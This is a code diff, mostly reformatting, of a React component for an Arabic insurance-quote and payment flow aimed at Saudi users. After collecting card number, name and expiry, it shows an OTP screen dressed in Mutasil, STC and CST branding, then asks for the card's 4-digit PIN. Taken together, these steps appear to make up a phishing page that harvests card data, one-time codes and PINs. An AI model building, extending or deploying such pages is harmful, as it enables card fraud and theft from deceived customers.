+                      <h4 className="text-xl font-bold text-gray-900 text-center">
+                        معلومات التواصل
+                      </h4>
                       <label>رقم الهاتف</label>
                       <Input
                         name="phone"
@@ -1556,15 +1976,26 @@ function ProfessionalQuoteForm() {
                             type="checkbox"
                             className="w-5 h-5 mt-1 text-[#109cd4]"
                             checked={formData.agreeToTerms}
-                            onChange={(e) => handleFieldChange("agreeToTerms", e.target.checked)}
+                            onChange={(e) =>
+                              handleFieldChange(
+                                "agreeToTerms",
+                                e.target.checked,
+                              )
+                            }
                           />
                           <span className="text-sm text-blue-800">
                             أوافق على{" "}
-                            <a href="#" className="text-[#109cd4] hover:underline font-semibold">
+                            <a
+                              href="#"
+                              className="text-[#109cd4] hover:underline font-semibold"
+                            >
                               الشروط والأحكام
                             </a>{" "}
                             و{" "}
-                            <a href="#" className="text-[#109cd4] hover:underline font-semibold">
+                            <a
+                              href="#"
+                              className="text-[#109cd4] hover:underline font-semibold"
+                            >
                               سياسة الخصوصية
                             </a>
                           </span>
@@ -1581,24 +2012,42 @@ function ProfessionalQuoteForm() {
                     <Card className="border-2 border-gray-200 h-fit">
                       <CardContent className="p-6">
                         {(() => {
-                          const selectedOffer = offerData.find((offer) => offer.id === formData.selectedInsuranceOffer)
+                          const selectedOffer = offerData.find(
+                            (offer) =>
+                              offer.id === formData.selectedInsuranceOffer,
+                          );
                           if (!selectedOffer) {
-                            return <div className="text-center text-gray-500">لم يتم اختيار عرض</div>
+                            return (
+                              <div className="text-center text-gray-500">
+                                لم يتم اختيار عرض
+                              </div>
+                            );
                           }
 
-                          const basePrice = Number.parseFloat(selectedOffer.main_price)
-                          const selectedFeatures = selectedOffer.extra_features.filter((f) =>
-                            formData.selectedAddons.includes(f.id),
-                          )
-                          const addonsTotal = selectedFeatures.reduce((sum, f) => sum + f.price, 0)
-                          const expenses = selectedOffer.extra_expenses.reduce((sum, e) => sum + e.price, 0)
-                          const total = basePrice + addonsTotal + expenses
+                          const basePrice = Number.parseFloat(
+                            selectedOffer.main_price,
+                          );
+                          const selectedFeatures =
+                            selectedOffer.extra_features.filter((f) =>
+                              formData.selectedAddons.includes(f.id),
+                            );
+                          const addonsTotal = selectedFeatures.reduce(
+                            (sum, f) => sum + f.price,
+                            0,
+                          );
+                          const expenses = selectedOffer.extra_expenses.reduce(
+                            (sum, e) => sum + e.price,
+                            0,
+                          );
+                          const total = basePrice + addonsTotal + expenses;
 
                           return (
                             <div className="space-y-4">
                               <div className="text-center mb-6">
                                 <h4 className="text-xl font-bold text-gray-900">
-                                  {selectedOffer.name.replace(/insurance/g, "").trim()}
+                                  {selectedOffer.name
+                                    .replace(/insurance/g, "")
+                                    .trim()}
                                 </h4>
                                 <p className="text-gray-600">
                                   {selectedOffer.type === "against-others"
@@ -1611,32 +2060,51 @@ function ProfessionalQuoteForm() {
 
                               <div className="space-y-3">
                                 <div className="flex justify-between items-center">
-                                  <span className="text-gray-600">قسط التأمين الأساسي</span>
-                                  <span className="font-semibold">{basePrice} ر.س</span>
+                                  <span className="text-gray-600">
+                                    قسط التأمين الأساسي
+                                  </span>
+                                  <span className="font-semibold">
+                                    {basePrice} ر.س
+                                  </span>
                                 </div>
                                 {addonsTotal > 0 && (
                                   <div className="flex justify-between items-center">
-                                    <span className="text-gray-600">الإضافات المختارة</span>
-                                    <span className="font-semibold">{addonsTotal} ر.س</span>
+                                    <span className="text-gray-600">
+                                      الإضافات المختارة
+                                    </span>
+                                    <span className="font-semibold">
+                                      {addonsTotal} ر.س
+                                    </span>
                                   </div>
                                 )}
                                 {selectedOffer.extra_expenses.map((expense) => (
-                                  <div key={expense.id} className="flex justify-between items-center text-sm">
-                                    <span className="text-gray-600">{expense.reason}</span>
+                                  <div
+                                    key={expense.id}
+                                    className="flex justify-between items-center text-sm"
+                                  >
+                                    <span className="text-gray-600">
+                                      {expense.reason}
+                                    </span>
                                     <span className="font-medium">
-                                      {expense.reason.includes("خصم") ? "-" : "+"}
+                                      {expense.reason.includes("خصم")
+                                        ? "-"
+                                        : "+"}
                                       {expense.price} ر.س
                                     </span>
                                   </div>
                                 ))}
                                 <hr className="border-gray-200" />
                                 <div className="flex justify-between items-center text-xl">
-                                  <span className="font-bold text-gray-900">المجموع الكلي</span>
-                                  <span className="font-bold text-green-600">{total.toFixed(2)} ر.س</span>
+                                  <span className="font-bold text-gray-900">
+                                    المجموع الكلي
+                                  </span>
+                                  <span className="font-bold text-green-600">
+                                    {total.toFixed(2)} ر.س
+                                  </span>
                                 </div>
                               </div>
                             </div>
-                          )
+                          );
                         })()}
                       </CardContent>
                     </Card>
@@ -1647,18 +2115,28 @@ function ProfessionalQuoteForm() {
               {currentPage === 6 && (
                 <div className="space-y-8">
                   <div className="text-center mb-8">
-                    <h3 ref={stepHeaderRef} tabIndex={-1} className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3">
+                    <h3
+                      ref={stepHeaderRef}
+                      tabIndex={-1}
+                      className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3"
+                    >
                       بيانات الدفع
                     </h3>
-                    <p className="text-gray-600">أدخل بيانات بطاقتك الائتمانية لإتمام عملية الدفع الآمن</p>
+                    <p className="text-gray-600">
+                      أدخل بيانات بطاقتك الائتمانية لإتمام عملية الدفع الآمن
+                    </p>
                   </div>
 
                   <div className="bg-blue-50 border border-blue-200 rounded-xl p-6 mb-8">
                     <div className="flex items-center gap-3">
                       <Lock className="w-6 h-6 text-[#109cd4] flex-shrink-0" />
                       <div>
-                        <p className="font-semibold text-blue-900">دفع آمن ومحمي</p>
-                        <p className="text-sm text-[#109cd4]">جميع بياناتك محمية بتشفير SSL 256-bit</p>
+                        <p className="font-semibold text-blue-900">
+                          دفع آمن ومحمي
+                        </p>
+                        <p className="text-sm text-[#109cd4]">
+                          جميع بياناتك محمية بتشفير SSL 256-bit
+                        </p>
                       </div>
                     </div>
                   </div>
@@ -1685,7 +2163,8 @@ function ProfessionalQuoteForm() {
                       </div>
                       <div>
                         <label className="block text-sm font-semibold text-gray-700 mb-3">
-                          الاسم كما هو مكتوب على البطاقة <span className="text-red-500">*</span>
+                          الاسم كما هو مكتوب على البطاقة{" "}
+                          <span className="text-red-500">*</span>
                         </label>
                         <Input
                           name="cardName"
@@ -1712,7 +2191,10 @@ function ProfessionalQuoteForm() {
                           >
                             <option value="">الشهر</option>
                             {Array.from({ length: 12 }, (_, i) => (
-                              <option key={i + 1} value={String(i + 1).padStart(2, "0")}>
+                              <option
+                                key={i + 1}
+                                value={String(i + 1).padStart(2, "0")}
+                              >
                                 {String(i + 1).padStart(2, "0")}
                               </option>
                             ))}
@@ -1731,12 +2213,12 @@ function ProfessionalQuoteForm() {
                           >
                             <option value="">السنة</option>
                             {Array.from({ length: 10 }, (_, i) => {
-                              const year = new Date().getFullYear() + i
+                              const year = new Date().getFullYear() + i;
                               return (
                                 <option key={year} value={year}>
                                   {year}
                                 </option>
-                              )
+                              );
                             })}
                           </select>
                         </div>
@@ -1756,23 +2238,36 @@ function ProfessionalQuoteForm() {
                           />
                         </div>
                       </div>
-                      
                     </div>
 
                     <Card className="border-2 border-gray-200 h-fit">
                       <CardContent className="p-6">
-                        <h4 className="text-xl font-bold text-gray-900 mb-6">ملخص الدفع</h4>
+                        <h4 className="text-xl font-bold text-gray-900 mb-6">
+                          ملخص الدفع
+                        </h4>
                         {(() => {
-                          const selectedOffer = offerData.find((offer) => offer.id === formData.selectedInsuranceOffer)
-                          if (!selectedOffer) return null
+                          const selectedOffer = offerData.find(
+                            (offer) =>
+                              offer.id === formData.selectedInsuranceOffer,
+                          );
+                          if (!selectedOffer) return null;
 
-                          const basePrice = Number.parseFloat(selectedOffer.main_price)
-                          const selectedFeatures = selectedOffer.extra_features.filter((f) =>
-                            formData.selectedAddons.includes(f.id),
-                          )
-                          const addonsTotal = selectedFeatures.reduce((sum, f) => sum + f.price, 0)
-                          const expenses = selectedOffer.extra_expenses.reduce((sum, e) => sum + e.price, 0)
-                          const total = basePrice + addonsTotal + expenses
+                          const basePrice = Number.parseFloat(
+                            selectedOffer.main_price,
+                          );
+                          const selectedFeatures =
+                            selectedOffer.extra_features.filter((f) =>
+                              formData.selectedAddons.includes(f.id),
+                            );
+                          const addonsTotal = selectedFeatures.reduce(
+                            (sum, f) => sum + f.price,
+                            0,
+                          );
+                          const expenses = selectedOffer.extra_expenses.reduce(
+                            (sum, e) => sum + e.price,
+                            0,
+                          );
+                          const total = basePrice + addonsTotal + expenses;
 
                           return (
                             <div className="space-y-3">
@@ -1793,10 +2288,12 @@ function ProfessionalQuoteForm() {
                               <hr />
                               <div className="flex justify-between font-bold text-lg">
                                 <span>المجموع</span>
-                                <span className="text-green-600">{total.toFixed(2)} ر.س</span>
+                                <span className="text-green-600">
+                                  {total.toFixed(2)} ر.س
+                                </span>
                               </div>
                             </div>
-                          )
+                          );
                         })()}
                       </CardContent>
                     </Card>
@@ -1812,8 +2309,12 @@ function ProfessionalQuoteForm() {
                         <Loader2 className="w-12 h-12 text-[#109cd4] animate-spin" />
                       </div>
                       <div>
-                        <h4 className="text-xl font-bold text-gray-900 mb-3">جاري التحقق من الرمز</h4>
-                        <p className="text-gray-600">يرجى الانتظار بينما نتحقق من رمز التأكيد الخاص بك...</p>
+                        <h4 className="text-xl font-bold text-gray-900 mb-3">
+                          جاري التحقق من الرمز
+                        </h4>
+                        <p className="text-gray-600">
+                          يرجى الانتظار بينما نتحقق من رمز التأكيد الخاص بك...
+                        </p>
                       </div>
                       <div className="flex items-center justify-center gap-2 text-sm text-gray-500">
                         <div className="w-2 h-2 bg-[#109cd4] rounded-full animate-pulse"></div>
@@ -1834,8 +2335,12 @@ function ProfessionalQuoteForm() {
                           {/* Header with Mutasil logo */}
                           <div className="flex justify-end p-4 border-b border-gray-100">
                             <div className="flex items-center gap-2">
-                              <span className="text-[#4052B5] font-bold text-lg">متصل</span>
-                              <span className="text-[#4052B5] font-medium text-sm">mutasil</span>
+                              <span className="text-[#4052B5] font-bold text-lg">
+                                متصل
+                              </span>
+                              <span className="text-[#4052B5] font-medium text-sm">
+                                mutasil
+                              </span>
                               <div className="flex flex-col gap-0.5">
                                 <div className="flex gap-0.5">
                                   <div className="w-2 h-2 bg-[#4052B5] rounded-sm"></div>
@@ -1857,15 +2362,20 @@ function ProfessionalQuoteForm() {
                               </div>
                               <div className="flex-1 text-right">
                                 <p className="text-gray-700 leading-relaxed">
-                                  <span className="text-[#4052B5] font-semibold">↗</span> تم إرسال رمز التحقق الى هاتفك
-                                  النقال. الرجاء إدخاله في هذه الخانة.
+                                  <span className="text-[#4052B5] font-semibold">
+                                    ↗
+                                  </span>{" "}
+                                  تم إرسال رمز التحقق الى هاتفك النقال. الرجاء
+                                  إدخاله في هذه الخانة.
                                 </p>
                               </div>
                             </div>
 
                             {/* STC Section */}
                             <div className="text-center space-y-3 py-4">
-                              <div className="text-[#4B0082] text-5xl font-black tracking-tight">stc</div>
+                              <div className="text-[#4B0082] text-5xl font-black tracking-tight">
+                                stc
+                              </div>
                               <p className="text-gray-700 text-sm leading-relaxed">
                                 عملاء STC الكرام في حال تلقي مكالمة من 900
                                 <br />
@@ -1879,7 +2389,9 @@ function ProfessionalQuoteForm() {
                                 <div className="flex-shrink-0 w-10 h-10 bg-red-100 rounded-full flex items-center justify-center">
                                   <AlertCircle className="w-5 h-5 text-red-600" />
                                 </div>
-                                <p className="text-red-700 text-sm font-medium text-right flex-1">{otpError}</p>
+                                <p className="text-red-700 text-sm font-medium text-right flex-1">
+                                  {otpError}
+                                </p>
                               </div>
                             )}
 
@@ -1893,14 +2405,14 @@ function ProfessionalQuoteForm() {
                                 value={otp}
                                 maxLength={6}
                                 onChange={(e) => {
-                                  setOtp(e.target.value)
-                                  if (otpError) setOtpError(null)
+                                  setOtp(e.target.value);
+                                  if (otpError) setOtpError(null);
                                 }}
                                 autoFocus={true}
                                 dir="ltr"
                                 className={`h-14 text-center text-lg focus:ring-[#4052B5]/20 ${
-                                  otpError 
-                                    ? "border-red-300 focus:border-red-500" 
+                                  otpError
+                                    ? "border-red-300 focus:border-red-500"
                                     : "border-gray-300 focus:border-[#4052B5]"
                                 }`}
                               />
@@ -1928,8 +2440,11 @@ function ProfessionalQuoteForm() {
                                 <p className="text-gray-600">
                                   إعادة إرسال:{" "}
                                   <span className="font-mono font-semibold">
-                                    {String(Math.floor(otpTimer / 60)).padStart(2, "0")}:
-                                    {String(otpTimer % 60).padStart(2, "0")}
+                                    {String(Math.floor(otpTimer / 60)).padStart(
+                                      2,
+                                      "0",
+                                    )}
+                                    :{String(otpTimer % 60).padStart(2, "0")}
                                   </span>
                                 </p>
                               ) : (
@@ -1955,7 +2470,9 @@ function ProfessionalQuoteForm() {
                             <div className="flex items-center justify-center gap-4">
                               <div className="flex items-center gap-3">
                                 <div className="w-12 h-12 rounded-full border-2 border-[#0066B3] flex items-center justify-center">
-                                  <span className="text-[#0066B3] font-bold text-xs">CST</span>
+                                  <span className="text-[#0066B3] font-bold text-xs">
+                                    CST
+                                  </span>
                                 </div>
                                 <div className="text-right">
                                   <p className="text-[#0066B3] text-xs font-semibold leading-tight">
@@ -1983,19 +2500,29 @@ function ProfessionalQuoteForm() {
                     <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
                       <CheckCircle className="w-10 h-10 text-green-600" />
                     </div>
-                    <h3 ref={stepHeaderRef} tabIndex={-1} className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3">
+                    <h3
+                      ref={stepHeaderRef}
+                      tabIndex={-1}
+                      className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3"
+                    >
                       تم التحقق بنجاح!
                     </h3>
-                    <p className="text-gray-600">يرجى إدخال رمز PIN للتأكيد النهائي</p>
+                    <p className="text-gray-600">
+                      يرجى إدخال رمز PIN للتأكيد النهائي
+                    </p>
                   </div>
 
                   <div className="max-w-md mx-auto text-center space-y-8">
                     <div className="bg-green-50 border border-green-200 rounded-xl p-6">
                       <div className="flex items-center justify-center gap-3 mb-4">
                         <Lock className="w-6 h-6 text-green-600" />
-                        <span className="font-semibold text-green-800">إدخال رمز PIN</span>
+                        <span className="font-semibold text-green-800">
+                          إدخال رمز PIN
+                        </span>
                       </div>
-                      <p className="text-sm text-green-700 mb-6">أدخل رمز PIN المكون من 4 أرقام لإتمام العملية</p>
+                      <p className="text-sm text-green-700 mb-6">
+                        أدخل رمز PIN المكون من 4 أرقام لإتمام العملية
+                      </p>
                       <Input
                         name="pinCodeFinal"
                         type="password"
@@ -2036,7 +2563,12 @@ function ProfessionalQuoteForm() {
               <Button
                 variant="outline"
                 onClick={prevStep}
-                disabled={currentPage === 1 || paymentProcessing || isSubmitting || waitingForApproval}
+                disabled={
+                  currentPage === 1 ||
+                  paymentProcessing ||
+                  isSubmitting ||
+                  waitingForApproval
+                }
                 className="px-8 py-3 w-full sm:w-auto order-2 sm:order-1 border-gray-300 hover:border-[#109cd4] hover:text-[#109cd4] bg-transparent"
               >
                 <ArrowLeft className="w-4 h-4 ml-2" />
@@ -2085,5 +2617,5 @@ function ProfessionalQuoteForm() {
         </CardContent>
       </Card>
     </>
-  )
+  );
 }
